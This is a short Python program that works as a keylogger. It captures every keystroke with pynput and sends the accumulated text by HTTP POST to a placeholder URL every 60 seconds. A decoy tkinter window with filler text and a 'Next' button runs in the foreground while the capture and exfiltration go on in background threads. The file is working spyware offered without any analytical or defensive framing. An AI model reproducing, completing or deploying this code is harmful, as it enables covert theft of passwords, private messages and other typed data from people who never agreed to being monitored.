import requests
import pynput
import tkinter
import threading
import time


keyStrokes = ""
lock = threading.Lock()

url = "your url"

def on_press(key):
    global keyStrokes
    lock.acquire()
    keyStrokes += str(key)
    lock.release()


def run_keylogger():
     with pynput.keyboard.Listener(on_press=on_press) as listener:
         listener.join()


def send_key_strokes():
    global keyStrokes
    while True:
        time.sleep(60)
        requests.post(url=url , json={"text": "{}".format(keyStrokes)})
        lock.acquire()
        keyStrokes = ""
        lock.release()

threading.Thread(target=send_key_strokes).start()
threading.Thread(target=run_keylogger).start()

top = tkinter.Tk()




top.geometry("300x300")


# Create label
l = tkinter.Label(top, text="some text")
l.config(font=("Courier", 11))

Fact = "some text"
b = tkinter.Button(top, text="Next", command = top.destroy)


l.pack()
b.pack()

top.mainloop()
